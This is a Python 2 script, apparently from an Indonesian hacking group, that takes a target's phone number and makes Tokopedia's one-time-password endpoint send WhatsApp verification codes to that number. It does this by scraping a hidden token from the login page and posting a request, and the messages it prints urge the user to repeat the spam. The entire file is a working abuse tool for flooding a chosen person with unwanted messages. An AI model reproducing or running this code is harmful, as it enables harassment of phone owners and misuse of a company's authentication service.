#!/usr/bin/python2

# Creator :  ./FUKUR0-3XP
# Team : Black Coders Satanic Exploiter Team ( BCA - X666X )
# Thanks To All Member Python Tutorial
# Recode Tidak Akan Membuat Anda Menjadi Pencipta Kode :3

from requests.exceptions import ConnectionError
from time import sleep
import requests
import random
import sys
import os
import re

M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
A = '\033[90m'

def banner():
	print(''+C+'''

  ____                         __        __    
 / ___| _ __   __ _ _ __ ___   \ \      / /_ _ 
 \___ \| '_ \ / _` | '_ ` _ \   \ \ /\ / / _` |
  ___) | |_) | (_| | | | | | |   \ V  V / (_| |
 |____/| .__/ \__,_|_| |_| |_|    \_/\_/ \__,_|
       |_|                                     
                   '''+W+'Creator : ./Fukur0\n\t\t   YT : Jejak Cyber')
                   
def main():
	os.system('clear')
	print(C+'Subscribe YT'+W+' Gua Dlu Su !'+C+' :V')
	sleep(1.5)
	os.system('xdg-open https://www.youtube.com/channel/UCzsADl8XRJeZXJ6CKZLX5KQ')
	os.system('clear')
	banner()
	print('')
	print('')
	nomor = raw_input(''+C+'MASUKKAN NOMOR TARGET'+W+' ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
	agent = requests.get('https://pastebin.com/raw/zkCXTGcm').text.split('\n')
	acak = random.choice(agent)
			
	headers = {
	'Connection' : 'keep-alive',
	'Accept' : 'application/json, text/javascript, */*; q=0.01',
	'Origin' : 'https://accounts.tokopedia.com',
	'X-Requested-With' : 'XMLHttpRequest',
	'User-Agent' : '{acak}',
	'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
	'Accept-Encoding' : 'gzip, deflate',
	}
			
	site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = headers).text
	search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
			
	data = {
	'otp_type' : '116',
	'msisdn' : nomor,
	'tk' : search,
	'email' : '',
	'original_param' : '',
	'user_id' : '',
	'signature' : '',
	'number_otp_digit' : '6',
	}
			
	try:
		send = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = headers, data = data)
		if 'Anda sudah melakukan 3 kali pengiriman kode' in send.text:
			print('')
			print(''+C+'Pengiriman'+A+' Gagal !')
			print('')
			print(W+'Tunggu 25 Menit Lagi Anjenk :v')
			print('')
		
		else:
			print('')
			print(''+C+'Pengiriman'+W+' Sukses !')
			print('')
			print(W+'Ulang Lagi Anjenk Kalo Mau Banyak :v')
			print(W+'Maksimal Pengulangan 3 x Dalam 25 Menit :`-|')
			print('')
			
	except:
		print('')
		print(M+'Cek Koneksi / Terjadi Kesalahan !')
		
if __name__ == '__main__':
	main()